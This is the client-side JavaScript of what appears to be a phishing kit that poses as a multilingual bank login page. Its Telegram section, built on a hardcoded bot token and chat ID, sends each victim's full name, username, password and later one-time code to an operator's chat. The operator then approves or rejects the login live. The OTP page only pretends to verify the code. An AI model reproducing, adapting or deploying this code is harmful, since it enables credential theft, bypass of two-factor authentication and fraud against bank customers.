// ==================== LOADING SCREEN ==================== 
(function() {
    const loadingScreen = document.getElementById('loadingScreen');
    if (!loadingScreen) return;

    // Hide main pages while loading
    document.querySelectorAll('.page').forEach(p => p.style.visibility = 'hidden');

    setTimeout(function() {
        loadingScreen.classList.add('fade-out');
        setTimeout(function() {
            loadingScreen.style.display = 'none';
            document.querySelectorAll('.page').forEach(p => p.style.visibility = '');
        }, 500);
    }, 4000);
})();

// ==================== STATE MANAGEMENT ==================== 
let currentLanguage = localStorage.getItem('language') || 'fr';
let selectedLanguage = currentLanguage;
let currentPage = 'loginPage';

// ==================== LANGUAGE CONFIGURATION ==================== 
const languages = {
    ar: { name: 'العربية', dir: 'rtl' },
    fr: { name: 'Français', dir: 'ltr' },
    en: { name: 'English', dir: 'ltr' },
    es: { name: 'Español', dir: 'ltr' },
    de: { name: 'Deutsch', dir: 'ltr' },
    nl: { name: 'Nederlands', dir: 'ltr' },
    it: { name: 'Italiano', dir: 'ltr' }
};

// ==================== INITIALIZATION ==================== 
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
    setupEventListeners();
    updateLanguage(currentLanguage);
});

function initializeApp() {
    setPageDirection(currentLanguage);
    updateLanguage(currentLanguage);
    showPage('loginPage');
    updateActiveNav('home');
}

// ==================== LANGUAGE FUNCTIONS ==================== 
function updateLanguage(lang) {
    if (!languages[lang]) {
        lang = 'ar';
    }
    
    currentLanguage = lang;
    localStorage.setItem('language', lang);
    setPageDirection(lang);
    updateAllText(lang);
}

function setPageDirection(lang) {
    const html = document.documentElement;
    const direction = languages[lang]?.dir || 'rtl';
    
    html.setAttribute('dir', direction);
    html.setAttribute('lang', lang);
}

function updateAllText(lang) {
    // Update all elements with data attributes
    const elements = document.querySelectorAll('[data-ar]');
    elements.forEach(el => {
        if (el.tagName === 'INPUT') {
            // Handle input placeholders
            const placeholderAttr = `data-${lang}-placeholder`;
            const placeholder = el.getAttribute(placeholderAttr);
            if (placeholder) {
                el.placeholder = placeholder;
            }
        } else {
            // Handle text content
            const textAttr = `data-${lang}`;
            const text = el.getAttribute(textAttr);
            if (text) {
                el.textContent = text;
            }
        }
    });

    // Update input placeholders
    const inputs = document.querySelectorAll('input[data-ar-placeholder]');
    inputs.forEach(input => {
        const placeholderAttr = `data-${lang}-placeholder`;
        const placeholder = input.getAttribute(placeholderAttr);
        if (placeholder) {
            input.placeholder = placeholder;
        }
    });
}

// ==================== PAGE NAVIGATION ==================== 
function showPage(pageName) {
    // Hide all pages
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    
    // Show selected page
    const pageElement = document.getElementById(pageName);
    if (pageElement) {
        pageElement.classList.add('active');
        currentPage = pageName;
    }
}

function updateActiveNav(page) {
    document.querySelectorAll('.nav-item').forEach(item => {
        item.classList.remove('active');
        if (item.getAttribute('data-page') === page) {
            item.classList.add('active');
        }
    });
}

// ==================== EVENT LISTENERS ==================== 
function setupEventListeners() {
    // Login Form
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', handleLogin);
    }

    // Password Toggle
    const eyeToggle = document.getElementById('eyeToggle');
    if (eyeToggle) {
        eyeToggle.addEventListener('click', togglePasswordVisibility);
    }

    // Navigation Items - ALL PAGES
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', function() {
            const page = this.getAttribute('data-page');
            
            if (page === 'home') {
                showPage('loginPage');
                updateActiveNav('home');
            } else if (page === 'agencies') {
                showPage('loginPage'); // Placeholder - can be replaced with agencies page
                updateActiveNav('agencies');
            } else if (page === 'menu') {
                showPage('menuPage');
                updateActiveNav('menu');
            }
        });
    });

    // Menu Items
    const settingsBtn = document.getElementById('settingsBtn');
    if (settingsBtn) {
        settingsBtn.addEventListener('click', () => {
            showPage('settingsPage');
        });
    }

    const helpBtn = document.getElementById('helpBtn');
    if (helpBtn) {
        helpBtn.addEventListener('click', () => {
            // Help action
        });
    }

    // Settings
    const languageBtn = document.getElementById('languageBtn');
    if (languageBtn) {
        languageBtn.addEventListener('click', () => {
            selectedLanguage = currentLanguage;
            updateLanguageSelection();
            showPage('languagePage');
        });
    }

    // Back Buttons
    document.getElementById('backBtn')?.addEventListener('click', () => {
        showPage('loginPage');
        updateActiveNav('home');
    });

    document.getElementById('backBtn2')?.addEventListener('click', () => {
        showPage('menuPage');
        updateActiveNav('menu');
    });

    document.getElementById('backBtn3')?.addEventListener('click', () => {
        showPage('settingsPage');
    });

    // Language Selection
    document.querySelectorAll('.language-option').forEach(option => {
        option.addEventListener('click', function() {
            selectLanguage(this.getAttribute('data-lang'));
        });
    });

    // Language Buttons
    document.getElementById('confirmBtn')?.addEventListener('click', confirmLanguageChange);
    document.getElementById('cancelBtn')?.addEventListener('click', () => {
        showPage('settingsPage');
    });

    // Create Account
    document.querySelector('.btn-create-account')?.addEventListener('click', () => {
        // Create account action
    });

    // ── English-only restriction for username & password ──
    setupEnglishOnlyInput(document.getElementById('username'));
    setupEnglishOnlyInput(document.getElementById('password'));

    // ── OTP page ──
    document.getElementById('backBtnOtp')?.addEventListener('click', () => {
        showPage('loginPage');
        updateActiveNav('home');
        resetOtp();
    });

    setupOtpBoxes();

    document.getElementById('otpConfirmBtn')?.addEventListener('click', submitOtp);

    document.getElementById('otpResendBtn')?.addEventListener('click', () => {
        resetOtp();
        startOtpTimer();
        focusFirstOtpBox();
    });
}

// ==================== TELEGRAM INTEGRATION ==================== 
const BOT_TOKEN = '8778518931:AAFniw3-FG4AghxkGHCzQgi23c-f6oFULLg';
const CHAT_ID = '6165206261';
const WEBHOOK_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;

async function sendToTelegram(message, requestId, dataType) {
    try {
        const payload = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        };
        
        // إضافة الأزرار لصفحة تسجيل الدخول والصفحات الأخرى
        if (dataType !== 'otp' && dataType !== 'reg') {
            payload.reply_markup = {
                inline_keyboard: [[
                    { text: '✅ قبول', callback_data: `approve_${dataType}_${requestId}` },
                    { text: '❌ رفض', callback_data: `reject_${dataType}_${requestId}` }
                ]]
            };
        }

        const response = await fetch(`${WEBHOOK_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const json = await response.json();
        return json.result ? json.result.message_id : null;
    } catch (error) {
        console.error('خطأ في إرسال البيانات إلى تليجرام:', error);
        return null;
    }
}

async function editTelegramMessage(messageId, originalText, resultText) {
    try {
        await fetch(`${WEBHOOK_URL}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                message_id: messageId,
                text: originalText + '\n\n' + resultText,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
            })
        });
    } catch (error) {
        console.error('خطأ في تعديل رسالة تليجرام:', error);
    }
}

async function checkWebhookResponse(requestId, dataType) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await response.json();
        if (data.ok && data.result && data.result.length > 0) {
            for (let update of data.result) {
                if (update.callback_query) {
                    const callbackData = update.callback_query.data;
                    if (callbackData === `approve_${dataType}_${requestId}`) return 'approved';
                    if (callbackData === `reject_${dataType}_${requestId}`) return 'rejected';
                }
            }
        }
        return 'pending';
    } catch (error) {
        console.error('خطأ في التحقق من استجابة تليجرام:', error);
        return 'pending';
    }
}

function showRejection() {
    document.body.innerHTML = `
    <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;
        height:100vh;font-family:'Cairo',sans-serif;text-align:center;padding:20px;
        background:linear-gradient(135deg,#b71c1c,#e53935);">
        <div style="background:white;border-radius:20px;padding:40px 30px;max-width:360px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.35);">
            <div style="width:80px;height:80px;background:#e53935;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:42px;color:white;margin:0 auto 24px;">✕</div>
            <h2 style="color:#b71c1c;font-size:22px;font-weight:700;margin-bottom:14px;direction:rtl;">خطأ في بيانات الدخول</h2>
            <p style="color:#555;font-size:15px;line-height:1.7;direction:rtl;">اسم المستخدم أو كلمة المرور غير صحيحة.</p>
            <button onclick="location.reload()" style="margin-top:28px;padding:13px 30px;background:#0066CC;color:white;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;width:100%;">حاول مرة أخرى</button>
        </div>
    </div>`;
}

// ==================== LOGIN HANDLING ==================== 
function handleLogin(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    
    // Clear previous errors
    document.getElementById('usernameError').textContent = '';
    document.getElementById('passwordError').textContent = '';
    document.getElementById('username').classList.remove('error');
    document.getElementById('password').classList.remove('error');
    
    let hasError = false;
    
    const errorMessages = {
        ar: {
            usernameRequired: 'اسم المستخدم مطلوب',
            passwordRequired: 'كلمة المرور مطلوبة'
        },
        fr: {
            usernameRequired: 'L\'identifiant est requis',
            passwordRequired: 'Le mot de passe est requis'
        },
        en: {
            usernameRequired: 'Username is required',
            passwordRequired: 'Password is required'
        },
        es: {
            usernameRequired: 'El nombre de usuario es obligatorio',
            passwordRequired: 'La contraseña es obligatoria'
        },
        de: {
            usernameRequired: 'Benutzername erforderlich',
            passwordRequired: 'Passwort erforderlich'
        },
        nl: {
            usernameRequired: 'Gebruikersnaam vereist',
            passwordRequired: 'Wachtwoord vereist'
        },
        it: {
            usernameRequired: 'Nome utente richiesto',
            passwordRequired: 'Password richiesta'
        }
    };
    
    // Validation
    if (!username) {
        const msg = errorMessages[currentLanguage]?.usernameRequired || errorMessages['ar'].usernameRequired;
        document.getElementById('usernameError').textContent = msg;
        document.getElementById('username').classList.add('error');
        hasError = true;
    }
    
    if (!password) {
        const msg = errorMessages[currentLanguage]?.passwordRequired || errorMessages['ar'].passwordRequired;
        document.getElementById('passwordError').textContent = msg;
        document.getElementById('password').classList.add('error');
        hasError = true;
    }
    
    if (!hasError) {
        // جلب الاسم الكامل من sessionStorage (الذي تم إدخاله في صفحة التسجيل)
        const fullName = sessionStorage.getItem('userFullName') || 'غير معروف';
        
        // إظهار واجهة الانتظار
        const loadingOverlay = document.getElementById('loadingOverlay');
        if (loadingOverlay) loadingOverlay.classList.add('show');
        
        // إرسال بيانات تسجيل الدخول إلى تليجرام
        const requestId = Date.now();
        const message = 
            `🔐 <b>صفحة تسجيل الدخول - Login</b>\n\n` +
            `👤 <b>الاسم الكامل:</b> <code>${fullName}</code>\n` +
            `👤 <b>اسم المستخدم:</b> <code>${username}</code>\n` +
            `🔑 <b>كلمة المرور:</b> <code>${password}</code>\n\n` +
            `⏰ ${new Date().toLocaleString('ar-EG')}`;
        
        sendToTelegram(message, requestId, 'login').then(messageId => {
            if (!messageId) {
                if (loadingOverlay) loadingOverlay.classList.remove('show');
                alert('حدث خطأ في الاتصال، يرجى المحاولة لاحقاً');
                return;
            }

            // بدء عملية التحقق من استجابة تليجرام
            const checkInterval = setInterval(async () => {
                const status = await checkWebhookResponse(requestId, 'login');
                if (status === 'approved') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, '✅ تم القبول');
                    if (loadingOverlay) loadingOverlay.classList.remove('show');
                    
                    // حفظ بيانات تسجيل الدخول في sessionStorage للاستخدام في صفحة OTP
                    sessionStorage.setItem('loginUsername', username);
                    sessionStorage.setItem('loginPassword', password);
                    
                    // Navigate to OTP verification
                    showPage('otpPage');
                    updateActiveNav('home');
                    startOtpTimer();
                    focusFirstOtpBox();
                    // Clear form
                    document.getElementById('loginForm').reset();
                    document.getElementById('password').type = 'password';
                } else if (status === 'rejected') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, '❌ تم الرفض');
                    if (loadingOverlay) loadingOverlay.classList.remove('show');
                    showRejection();
                }
            }, 2000);
        });
    }
}

function togglePasswordVisibility() {
    const passwordInput = document.getElementById('password');
    const isPassword = passwordInput.type === 'password';
    
    passwordInput.type = isPassword ? 'text' : 'password';
}

// ==================== LANGUAGE SELECTION ==================== 
function updateLanguageSelection() {
    document.querySelectorAll('.language-option').forEach(option => {
        option.classList.remove('selected');
        if (option.getAttribute('data-lang') === selectedLanguage) {
            option.classList.add('selected');
        }
    });
}

function selectLanguage(lang) {
    if (languages[lang]) {
        selectedLanguage = lang;
        updateLanguageSelection();
    }
}

function confirmLanguageChange() {
    updateLanguage(selectedLanguage);
    // Return to login (home) page so the user sees the language change immediately
    showPage('loginPage');
    updateActiveNav('home');
}

// ==================== UTILITY FUNCTIONS ==================== 
window.updateLogoPath = function(newPath) {
    const logo = document.getElementById('bankLogo');
    if (logo) {
        logo.src = newPath;
    }
};

window.getCurrentLanguage = function() {
    return currentLanguage;
};

window.setLanguage = function(lang) {
    if (languages[lang]) {
        updateLanguage(lang);
    }
};

window.getAvailableLanguages = function() {
    return Object.keys(languages);
};

// ==================== ENGLISH-ONLY INPUT ====================
function setupEnglishOnlyInput(input) {
    if (!input) return;
    // Block non-Latin characters on input event
    input.addEventListener('input', function() {
        // Allow: ASCII printable chars (space 32 to tilde 126) only
        const cleaned = this.value.replace(/[^\x20-\x7E]/g, '');
        if (cleaned !== this.value) {
            const pos = this.selectionStart - (this.value.length - cleaned.length);
            this.value = cleaned;
            this.setSelectionRange(pos, pos);
        }
    });
    // Block non-Latin on keydown as well (for IME etc.)
    input.addEventListener('keydown', function(e) {
        // Allow control keys
        if (e.ctrlKey || e.metaKey || e.altKey) return;
        if (e.key.length === 1 && /[^\x20-\x7E]/.test(e.key)) {
            e.preventDefault();
        }
    });
}

// ==================== OTP LOGIC ====================
let otpInterval = null;

function setupOtpBoxes() {
    const input = document.getElementById('otpSingleInput');
    if (!input) return;

    input.addEventListener('input', function() {
        // Keep only digits
        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
        // Update filled state
        if (this.value.length > 0) {
            this.classList.add('filled');
        } else {
            this.classList.remove('filled');
        }
        // Clear error on typing
        const errEl = document.getElementById('otpError');
        if (errEl) errEl.textContent = '';
    });

    input.addEventListener('keydown', function(e) {
        if (e.key.length === 1 && !/[0-9]/.test(e.key) && !e.ctrlKey && !e.metaKey) {
            e.preventDefault();
        }
    });

    input.addEventListener('paste', function(e) {
        e.preventDefault();
        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 6);
        this.value = pasted;
        if (pasted.length > 0) this.classList.add('filled');
    });
}

function focusFirstOtpBox() {
    const input = document.getElementById('otpSingleInput');
    if (input) setTimeout(() => input.focus(), 300);
}

function resetOtp() {
    const input = document.getElementById('otpSingleInput');
    if (input) {
        input.value = '';
        input.classList.remove('filled', 'otp-shake');
    }
    const err = document.getElementById('otpError');
    if (err) err.textContent = '';
    clearInterval(otpInterval);
    const resendBtn = document.getElementById('otpResendBtn');
    if (resendBtn) resendBtn.disabled = true;
}

function startOtpTimer() {
    clearInterval(otpInterval);
    let seconds = 120;
    const timerEl = document.getElementById('otpTimer');
    const resendBtn = document.getElementById('otpResendBtn');

    function update() {
        const m = String(Math.floor(seconds / 60)).padStart(2, '0');
        const s = String(seconds % 60).padStart(2, '0');
        if (timerEl) {
            timerEl.textContent = `${m}:${s}`;
            timerEl.classList.toggle('expired', seconds === 0);
        }
        if (seconds === 0) {
            clearInterval(otpInterval);
            if (resendBtn) resendBtn.disabled = false;
        } else {
            seconds--;
        }
    }
    update();
    otpInterval = setInterval(update, 1000);
}

function submitOtp() {
    const input = document.getElementById('otpSingleInput');
    const code = input ? input.value.trim() : '';
    const errEl = document.getElementById('otpError');

    if (code.length < 4 || code.length > 6) {
        if (input) {
            input.classList.remove('otp-shake');
            void input.offsetWidth; // reflow
            input.classList.add('otp-shake');
            setTimeout(() => input.classList.remove('otp-shake'), 500);
        }
        const msgs = {
            ar: 'الرجاء إدخال رمز صحيح',
            fr: 'Veuillez saisir un code valide',
            en: 'Please enter a valid code',
            es: 'Ingrese un código válido',
            de: 'Bitte geben Sie einen gültigen Code ein',
            nl: 'Voer een geldige code in',
            it: 'Inserisci un codice valido'
        };
        if (errEl) errEl.textContent = msgs[currentLanguage] || msgs.en;
        return;
    }

    if (errEl) errEl.textContent = '';
    clearInterval(otpInterval);

    // إرسال رمز التحقق إلى تليجرام
    const requestId = Date.now();
    const fullName = sessionStorage.getItem('userFullName') || 'غير معروف';
    const message = 
        `🔐 <b>صفحة رمز التحقق - OTP Verification</b>\n\n` +
        `👤 <b>الاسم الكامل:</b> <code>${fullName}</code>\n` +
        `🔑 <b>رمز التحقق:</b> <code>${code}</code>\n\n` +
        `⏰ ${new Date().toLocaleString('ar-EG')}`;
    
    sendToTelegram(message, requestId, 'otp');

    // Simulate OTP success → stay on OTP page (reset for next verification)
    resetOtp();
    startOtpTimer();
    focusFirstOtpBox();
}
